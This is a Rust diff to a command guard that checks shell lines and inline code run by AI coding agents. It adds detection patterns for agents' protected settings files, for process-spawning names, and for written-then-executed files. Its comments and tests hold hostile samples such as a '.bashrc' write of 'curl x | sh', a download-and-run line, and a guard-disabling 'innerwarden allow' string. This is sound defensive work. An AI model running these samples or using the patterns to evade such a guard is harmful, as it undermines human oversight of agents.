@@ -85,6 +85,10 @@ pub(crate) struct InlineReading {
     /// it, beside the same code with what its strings and comments hold
     /// taken out ([`data_literals_blanked`]).
     pub(crate) data_blanked: Vec<(String, String)>,
+    /// The same pieces with only their text taken out, as the guard's own
+    /// checks read them ([`Places::Kept`]): a string that may name a file
+    /// stays, the text the code only edits or prints goes.
+    pub(crate) guard_blanked: Vec<(String, String)>,
     /// The files the code writes ([`Sink::WriteFile`]), each with the text
     /// it writes there, a piece not read standing as `$IW_UNREAD`: a
     /// command of the same line that runs one runs that text
@@ -110,6 +114,7 @@ impl InlineReading {
             }
         }
         self.data_blanked.extend(other.data_blanked);
+        self.guard_blanked.extend(other.guard_blanked);
         for written in other.written {
             if !self.written.contains(&written) {
                 self.written.push(written);
@@ -797,7 +802,7 @@ pub(crate) fn read_code(lang: Lang, code: &str, depth: u8) -> InlineReading {
 /// in it), a quote left open, or a form whose literals are not told apart
 /// here from code (a regular expression, a Ruby command quote or
 /// here-document). Only Python, Node and Ruby are read.
-fn data_literal_ranges(lang: Lang, code: &str) -> Option<Vec<(usize, usize)>> {
+fn data_literal_ranges(lang: Lang, code: &str, places: Places) -> Option<Vec<(usize, usize)>> {
     if matches!(lang, Lang::Perl | Lang::Php | Lang::Lua) {
         return literals::literal_ranges(lang, code);
     }
@@ -917,6 +922,13 @@ fn data_literal_ranges(lang: Lang, code: &str) -> Option<Vec<(usize, usize)>> {
             _ => quote == b'"' && inner.contains("#{"),
         };
         if runs_code {
+            // For the guard's own checks a string that runs code where it
+            // stands (`f"{x}"`) stays in view, its code read as code
+            // outside the strings; the others are still taken out.
+            if places == Places::Kept {
+                at = end;
+                continue;
+            }
             return None;
         }
         ranges.push((at + open, end - open));
@@ -1126,6 +1138,76 @@ fn ruby_heredoc_bodies(
     Some(body_start.saturating_sub(1).max(start))
 }
 
+/// What [`data_literals_blanked`] does with a string that names a place.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Places {
+    /// Reads the code whole: no string is blanked.
+    Whole,
+    /// Keeps each string that may name a file, and blanks the rest.
+    Kept,
+}
+
+/// Whether a string of inline code stays in view for the guard's own checks
+/// ([`Places::Kept`]): what may be the name of a file the code acts on, or a
+/// lowering of the guard spelled out.
+///
+/// - A string with no blank: a path or a piece the code builds one from
+///   (`'settings'`, `'.claude'`, `'ude/settings.json'`, `'/opt/x'`).
+/// - A single line that names a place outside the working tree or a file
+///   an agent or the guard loads (`'/Users/A B/.claude/settings.json'`).
+/// - Text of any shape with a word that is a path to an agent's settings
+///   or to a file of the guard: code can pull a word out of text (`'''x\n/home/u/.claude/settings.json'''.split()[1]`).
+/// - Text that is a lowering of the guard on its own (`'innerwarden allow
+///   x'`), refused wherever it is written.
+///
+/// What is left is text that runs over lines, or a sentence that names no
+/// such place: what the code edits, prints or writes.
+fn may_name_a_file(text: &str) -> bool {
+    static NAMED: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let named = NAMED.get_or_init(|| {
+        regex::Regex::new(
+            r"(?i)settings(?:\.local)?\.json|claude\.json|mcp\.json|hooks\.json|config\.toml|iw-guard",
+        )
+        .expect("valid regex")
+    });
+    if !text.contains(char::is_whitespace) {
+        return true;
+    }
+    if !text.contains(['\n', '\r'])
+        && (names_a_place_outside_the_tree(text) || named.is_match(text))
+    {
+        return true;
+    }
+    if text.split_whitespace().any(word_names_a_protected_place) {
+        return true;
+    }
+    let lower = text.to_ascii_lowercase();
+    (lower.contains("innerwarden") || lower.contains("iw"))
+        && crate::threats::check_guard_self_disable(text).is_some()
+}
+
+/// Whether a word of text is a path to a place the guard keeps: an agent's
+/// settings or its folder, a file or folder of the guard
+/// (`~/.claude/settings.json`, `/var/lib/innerwarden`), its quotes and
+/// brackets taken off. A write of the account database is refused by what
+/// the line writes, read whole, not by these checks.
+pub(crate) fn word_names_a_protected_place(word: &str) -> bool {
+    static KEPT: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let kept = KEPT.get_or_init(|| {
+        regex::Regex::new(
+            r"(?i)settings(?:\.local)?\.json|claude\.json|mcp\.json|hooks\.json|(?:^|/)\.(?:claude|codex|cursor|gemini|openclaw|hermes|goose|aider|continue|windsurf|kiro)(?:/|$)|innerwarden|iw-guard",
+        )
+        .expect("valid regex")
+    });
+    let word = word.trim_matches(|c: char| {
+        matches!(
+            c,
+            '\'' | '"' | '`' | '(' | ')' | '[' | ']' | '{' | '}' | ',' | ';' | ':'
+        )
+    });
+    (word.contains('/') || word.starts_with('.') || word.ends_with(".json")) && kept.is_match(word)
+}
+
 /// Whether the text of a string names a place outside the working tree.
 pub(crate) fn names_a_place_outside_the_tree(text: &str) -> bool {
     static PLACE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
@@ -1140,7 +1222,10 @@ pub(crate) fn names_a_place_outside_the_tree(text: &str) -> bool {
 
 /// The names that, standing in code outside its strings, may start a
 /// process or run code in a way [`read_code`] does not account for.
-fn may_run_beyond_reading(lang: Lang, outside: &str) -> bool {
+fn may_run_beyond_reading(lang: Lang, outside: &str, places: Places) -> bool {
+    if places == Places::Kept {
+        return may_run_beyond_reading_with_places_kept(lang, outside);
+    }
     static PATTERNS: std::sync::OnceLock<[regex::Regex; 3]> = std::sync::OnceLock::new();
     let [python, js, ruby] = PATTERNS.get_or_init(|| {
         [
@@ -1167,6 +1252,40 @@ fn may_run_beyond_reading(lang: Lang, outside: &str) -> bool {
     }
 }
 
+/// [`may_run_beyond_reading`] where the strings that may name a file stay
+/// ([`Places::Kept`]): the names that only find a path (the home, an
+/// expansion of `~` or of a variable, the environment) start nothing, and
+/// what they find is read where the path is written. Python's dunders that
+/// only name a module or a file (`__name__`, `__file__`, `__main__`) start
+/// nothing either; those that reach any object's code still do. Nor does a
+/// method that only shares a builtin's name (`re.compile`, `cursor.execute`):
+/// the builtins `compile` and `exec` count as called.
+fn may_run_beyond_reading_with_places_kept(lang: Lang, outside: &str) -> bool {
+    static PATTERNS: std::sync::OnceLock<[regex::Regex; 3]> = std::sync::OnceLock::new();
+    let [python, js, ruby] = PATTERNS.get_or_init(|| {
+        [
+            regex::Regex::new(
+                r"\b(?:system|popen\w*|exec|execv\w*|execl\w*|eval|spawn\w*|Popen|getoutput|getstatusoutput|check_output|check_call|run_path|run_module|import_module|__import__|getattr|setattr|globals|locals|vars|__builtins__|builtins|fork\w*|breakpoint|subprocess|pty|commands|runpy|importlib|ctypes|cffi|pickle|marshal|dill|codeop|asyncio|multiprocessing|plumbum|pexpect|invoke|fabric|paramiko|webbrowser)\b|(?:^|[^.\w])compile\s*\(|__(?:import|builtins|dict|class|subclasses|globals|code|reduce|reduce_ex|getattribute|getattr|setattr|bases|mro|loader|spec|call|init_subclass|new)__|\bimport\s+(?:sh|code)\b|\bfrom\s+(?:sh|code)\s+import\b",
+            )
+            .expect("valid regex"),
+            regex::Regex::new(
+                r"\b(?:child_process|exec\w*|spawn\w*|fork|eval|Function|vm|require|import|Deno|Bun|process|Worker|execa|shelljs|zx|globalThis|global|Reflect|constructor|module|dlopen)\b",
+            )
+            .expect("valid regex"),
+            regex::Regex::new(
+                r"\b(?:system|exec|spawn|popen\w*|capture\w*|Open3|PTY|eval|instance_eval|class_eval|module_eval|instance_exec|class_exec|send|public_send|__send__|method|\w+_method|method_\w+|bind\w*|to_proc|load|require\w*|fork|syscall|Kernel|IO|binding|ObjectSpace|const_get|Process|open)\b",
+            )
+            .expect("valid regex"),
+        ]
+    });
+    match lang {
+        Lang::Python => python.is_match(outside),
+        Lang::Js => js.is_match(outside),
+        Lang::Ruby => ruby.is_match(outside),
+        _ => !literals::only_known_names(lang, outside),
+    }
+}
+
 /// `code` with what its strings and comments hold taken out, when they
 /// are only data: the code runs no process and no code but through calls
 /// [`read_code`] read (`reading`, read from this same code), whose lines
@@ -1180,6 +1299,7 @@ pub(crate) fn data_literals_blanked(
     lang: Lang,
     code: &str,
     reading: &InlineReading,
+    places: Places,
 ) -> Option<String> {
     if reading.unread || reading.code_unread || reading.runs_download {
         return None;
@@ -1189,18 +1309,7 @@ pub(crate) fn data_literals_blanked(
     if reading.residue.len() != code.len() || normalized_code(lang, code) != code {
         return None;
     }
-    let ranges = data_literal_ranges(lang, code)?;
-    // A string that names a place outside the working tree (an absolute
-    // path, the home, a dotfile, a scheduler or the sudo rules) may be the
-    // file the code writes, and what it writes there may run later: the
-    // line is read whole. `open('/home/u/.bashrc','a').write('curl x | sh')`
-    // was refused on main for the pipe to a shell it writes.
-    if ranges
-        .iter()
-        .any(|&(start, end)| names_a_place_outside_the_tree(&code[start..end]))
-    {
-        return None;
-    }
+    let ranges = data_literal_ranges(lang, code, places)?;
     // A Perl `open` whose mode or name pipes to a process (`"|-"`,
     // `"| sh"`, `"cmd |"`) runs what it is written.
     if lang == Lang::Perl
@@ -1211,16 +1320,48 @@ pub(crate) fn data_literals_blanked(
     {
         return None;
     }
+    let blanked_ranges: Vec<(usize, usize)> = match places {
+        // A string that names a place outside the working tree (an
+        // absolute path, the home, a dotfile, a scheduler or the sudo
+        // rules) may be the file the code writes, and what it writes there
+        // may run later: the line is read whole. `open('/home/u/.bashrc',
+        // 'a').write('curl x | sh')` was refused on main for the pipe to a
+        // shell it writes.
+        Places::Whole => {
+            if ranges
+                .iter()
+                .any(|&(start, end)| names_a_place_outside_the_tree(&code[start..end]))
+            {
+                return None;
+            }
+            ranges.clone()
+        }
+        // The guard's own checks ask where the code writes, not what: a
+        // string that may name a file stays ([`may_name_a_file`]), so a
+        // write of an agent's settings or of a file of the guard is read
+        // as before, and the text the code edits or prints goes.
+        Places::Kept => ranges
+            .iter()
+            .copied()
+            .filter(|&(start, end)| !may_name_a_file(&code[start..end]))
+            .collect(),
+    };
     let mut blanked = String::with_capacity(code.len());
+    let mut last = 0;
+    for &(start, end) in &blanked_ranges {
+        blanked.push_str(&code[last..start]);
+        last = end;
+    }
+    blanked.push_str(&code[last..]);
+    // The names the code calls, outside every string: a word a string
+    // holds (`'/home/u/x'`) is no call.
     let mut outside = String::with_capacity(code.len());
     let mut last = 0;
     for &(start, end) in &ranges {
-        blanked.push_str(&code[last..start]);
         outside.push_str(reading.residue.get(last..start)?);
         outside.push(' ');
         last = end;
     }
-    blanked.push_str(&code[last..]);
     outside.push_str(reading.residue.get(last..)?);
     if lang == Lang::Js {
         // `require('fs')` and its kind load a module that starts nothing.
@@ -1239,7 +1380,7 @@ pub(crate) fn data_literals_blanked(
             outside = any.replace_all(&outside, " ").into_owned();
         }
     }
-    if may_run_beyond_reading(lang, &outside) {
+    if may_run_beyond_reading(lang, &outside, places) {
         return None;
     }
     Some(blanked)
@@ -6014,6 +6155,106 @@ pub(crate) fn line_may_run_a_written_file(line: &str) -> bool {
     })
 }
 
+/// [`line_may_run_a_written_file`] for the guard's own checks, read from
+/// what the line writes: the targets of its redirections, of `tee` and of a
+/// copy or a link, and the files inline code writes (`written`). A program
+/// run by its path runs a written file where it, or a word handed to it, is
+/// one of them; a shell or an interpreter that reads its code from the
+/// line's own input (`python3 - <<'EOF'`, `bash -s <<'EOF'`) runs that
+/// code, which the reader reads, and no file. A program that writes files
+/// this does not follow (`curl -o`, `tar x`, `git checkout`), or inline
+/// code on a line that runs a script by name, keeps the old reading: any
+/// file may have been written. Measured 2026-11-28: `cd X && python3 -
+/// <<'EOF'` and `cat > note.md <<'EOF' ... ./tool send ...` were each taken
+/// for a line that runs a file it wrote.
+pub(crate) fn line_may_run_a_written_file_for_the_guard(
+    line: &str,
+    written: &[String],
+    code: bool,
+) -> bool {
+    const COPIES: &[&str] = &["cp", "mv", "install", "ln", "tee"];
+    const UNFOLLOWED: &[&str] = &[
+        "curl", "wget", "tar", "unzip", "rsync", "scp", "dd", "git", "gh", "patch", "sed", "perl",
+        "base64", "xxd", "make", "cargo", "npm", "pip", "pip3", "uv", "go",
+    ];
+    let read = crate::shell_words::read_line(line);
+    if read.commands.len() < 2 {
+        return false;
+    }
+    let base = |word: &str| -> String {
+        crate::threats::token_basename(word.trim_matches(['\'', '"']))
+            .trim_start_matches("./")
+            .to_owned()
+    };
+    let mut targets: Vec<String> = written.iter().map(|path| base(path)).collect();
+    let mut unfollowed = false;
+    for command in &read.commands {
+        targets.extend(command.writes.iter().map(|word| base(&word.text)));
+        let words: Vec<String> = command.words.iter().map(|w| w.text.clone()).collect();
+        let Some(at) = crate::threats::effective_command_index(&words) else {
+            continue;
+        };
+        let name = crate::threats::token_basename(&words[at]).to_ascii_lowercase();
+        let operands: Vec<&String> = words[at + 1..]
+            .iter()
+            .filter(|word| !word.starts_with('-'))
+            .collect();
+        if COPIES.contains(&name.as_str()) {
+            if name == "tee" {
+                targets.extend(operands.iter().map(|word| base(word)));
+            } else if let Some(last) = operands.last() {
+                targets.push(base(last));
+            }
+        } else if UNFOLLOWED.contains(&name.as_str()) {
+            unfollowed = true;
+        }
+    }
+    targets.retain(|target| !target.is_empty() && target != "null");
+    let names_a_target = |word: &str| targets.iter().any(|target| *target == base(word));
+    read.commands.iter().any(|command| {
+        let words: Vec<String> = command.words.iter().map(|w| w.text.clone()).collect();
+        let Some(at) = crate::threats::effective_command_index(&words) else {
+            return false;
+        };
+        if !command.words[at].is_plain() {
+            return unfollowed || !targets.is_empty();
+        }
+        if words[at].contains('/') {
+            return unfollowed || words[at..].iter().any(|word| names_a_target(word));
+        }
+        let name = crate::threats::token_basename(&words[at]).to_ascii_lowercase();
+        if matches!(
+            name.as_str(),
+            "chmod" | "xargs" | "find" | "eval" | "exec" | "install" | "crontab" | "at" | "batch"
+        ) {
+            return true;
+        }
+        let shell = SCRIPT_SHELLS.contains(&name.as_str());
+        if !shell && interpreter_lang(&name).is_none() {
+            return false;
+        }
+        let flags: &[char] = if shell { &['c'] } else { &['c', 'e', 'E', 'r'] };
+        let own_code = words[at + 1..].iter().any(|word| {
+            (word.starts_with('-') && !word.starts_with("--") && word[1..].contains(flags))
+                || word == "--eval"
+        });
+        // Its code read from the line's input: no operand before it, or `-`
+        // (a shell's `-s` too).
+        let operand = words[at + 1..]
+            .iter()
+            .find(|word| !(word.starts_with('-') && word.len() > 1));
+        let reads_its_input = !command.inputs.is_empty()
+            && (operand.is_none_or(|word| word == "-")
+                || (shell && words[at + 1..].iter().any(|word| word == "-s")));
+        if own_code || reads_its_input {
+            return false;
+        }
+        // A script run by name: one the line wrote, or any where the line
+        // writes in a way not followed or holds code that may write.
+        unfollowed || code || operand.is_some_and(|word| names_a_target(word))
+    })
+}
+
 /// The language an interpreter's program name runs (`python3.11`, `lua5.4`).
 fn interpreter_lang(name: &str) -> Option<Lang> {
     let name = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
@@ -6456,5 +6697,186 @@ mod tests {
             data_url_body("data:text/javascript;base64,bHM=").as_deref(),
             Some("ls")
         );
+    }
+
+    /// The strings that stay for the guard's own checks: a path or a piece
+    /// of one, a single line naming a place, a path to what the guard keeps
+    /// in text of any shape, and a lowering of the guard spelled out. Text
+    /// over lines or a sentence naming no such place goes.
+    #[test]
+    fn a_string_that_may_name_a_file_stays_and_text_goes() {
+        for text in [
+            "settings",
+            ".claude",
+            "ude/settings.json",
+            "/opt/x",
+            "/Users/A B/.claude/settings.json",
+            "see settings.json here",
+            "/Users/u/notes and more",
+            "x\n/home/u/.claude/settings.json",
+            "a b\nthe file /var/lib/innerwarden/x",
+            "innerwarden allow x",
+        ] {
+            assert!(may_name_a_file(text), "{text:?}");
+        }
+        for text in [
+            "tasks that touch sudoers\nrun alone",
+            "the probe ran chpasswd",
+            "a\nb c",
+            "rotate: the logs",
+            "x y\n/etc/sudoers",
+            "a b\nthe settings were read",
+        ] {
+            assert!(!may_name_a_file(text), "{text:?}");
+        }
+    }
+
+    #[test]
+    fn a_protected_place_is_a_path_word() {
+        for word in [
+            "~/.claude/settings.json",
+            "'/var/lib/innerwarden'",
+            "x/.codex/",
+            ".claude",
+            "settings.local.json",
+            "(\"/home/u/.cursor/mcp.json\"),",
+        ] {
+            assert!(word_names_a_protected_place(word), "{word}");
+        }
+        for word in [
+            "settings",
+            "notes/r.md",
+            "/etc/sudoers",
+            "innerwarden",
+            ".bashrc",
+        ] {
+            assert!(!word_names_a_protected_place(word), "{word}");
+        }
+    }
+
+    /// Kept: a path stays where the whole reading gives up, an f-string
+    /// stays in view, and the text goes.
+    #[test]
+    fn kept_places_keep_the_path_and_take_the_text_out() {
+        let code = "p='/srv/notes/r.md'\ns=open(p).read()\nopen(p,'w').write(s.replace('a', '''the probe ran\nchpasswd'''))\n";
+        let reading = read_code(Lang::Python, code, CODE_DEPTH);
+        assert_eq!(
+            data_literals_blanked(Lang::Python, code, &reading, Places::Whole),
+            None
+        );
+        let kept =
+            data_literals_blanked(Lang::Python, code, &reading, Places::Kept).expect("blanked");
+        assert!(kept.contains("/srv/notes/r.md"), "{kept}");
+        assert!(!kept.contains("chpasswd"), "{kept}");
+        let code = "n=1\nprint(f\"{n} lines\")\nprint('''the probe ran\nchpasswd''')\n";
+        let reading = read_code(Lang::Python, code, CODE_DEPTH);
+        assert_eq!(
+            data_literals_blanked(Lang::Python, code, &reading, Places::Whole),
+            None
+        );
+        let kept =
+            data_literals_blanked(Lang::Python, code, &reading, Places::Kept).expect("blanked");
+        assert!(kept.contains("{n} lines"), "{kept}");
+        assert!(!kept.contains("chpasswd"), "{kept}");
+    }
+
+    /// Where paths stay, the names that only find one start nothing, and a
+    /// method that shares a builtin's name is no call of the builtin.
+    #[test]
+    fn kept_places_count_only_what_may_start_something() {
+        for outside in [
+            "p = os.path.expanduser(x)",
+            "h = Path.home()",
+            "v = os.environ[x]",
+            "rx = re.compile(p)",
+            "cur.execute(q)",
+            "if __name__ == x: pass",
+        ] {
+            assert!(
+                !may_run_beyond_reading(Lang::Python, outside, Places::Kept),
+                "{outside}"
+            );
+        }
+        for outside in [
+            "compile(c, f, m)",
+            "exec(c)",
+            "os.execv(p, a)",
+            "x.__class__",
+        ] {
+            assert!(
+                may_run_beyond_reading(Lang::Python, outside, Places::Kept),
+                "{outside}"
+            );
+        }
+        assert!(may_run_beyond_reading(
+            Lang::Python,
+            "p = os.path.expanduser(x)",
+            Places::Whole
+        ));
+        assert!(may_run_beyond_reading(
+            Lang::Js,
+            "x = process.env.HOME",
+            Places::Kept
+        ));
+        assert!(!may_run_beyond_reading(
+            Lang::Js,
+            "x = os.homedir()",
+            Places::Kept
+        ));
+        assert!(!may_run_beyond_reading(
+            Lang::Ruby,
+            "x = Dir.home",
+            Places::Kept
+        ));
+        assert!(may_run_beyond_reading(Lang::Ruby, "open(x)", Places::Kept));
+    }
+
+    /// What the line writes decides what may run it: an interpreter reading
+    /// its own input runs no file, a program by its path runs one only when
+    /// it or its words name one.
+    #[test]
+    fn a_written_file_runs_where_the_line_hands_it_on() {
+        for line in [
+            "cd x && python3 - <<'EOF'\nprint(1)\nEOF",
+            "cd x && python3 script.py",
+            "cat > note.md <<'EOF'\nx\nEOF\n./tool send ops hi",
+            "bash -s <<'EOF'\nls\nEOF\nls",
+            "python3",
+            "ls; echo a > /dev/null",
+        ] {
+            assert!(
+                !line_may_run_a_written_file_for_the_guard(line, &[], false),
+                "{line}"
+            );
+        }
+        for line in [
+            "cat > a.sh <<'EOF'\nx\nEOF\nbash a.sh",
+            "cat > a.sh <<'EOF'\nx\nEOF\n./a.sh",
+            "curl -o x https://e.example; ./x",
+            "echo a > f; chmod +x f",
+            "cp a b; ./b",
+            "echo a | tee t; ./t",
+            "echo a > f; $X",
+        ] {
+            assert!(
+                line_may_run_a_written_file_for_the_guard(line, &[], false),
+                "{line}"
+            );
+        }
+        assert!(line_may_run_a_written_file_for_the_guard(
+            "python3 -c 'print(1)' && bash run.sh",
+            &[],
+            true
+        ));
+        assert!(line_may_run_a_written_file_for_the_guard(
+            "python3 -c 'x' && ./w.sh",
+            &["/srv/w.sh".to_owned()],
+            false
+        ));
+        assert!(!line_may_run_a_written_file_for_the_guard(
+            "python3 -c 'x' && ./w.sh",
+            &["/srv/other.sh".to_owned()],
+            false
+        ));
     }
 }
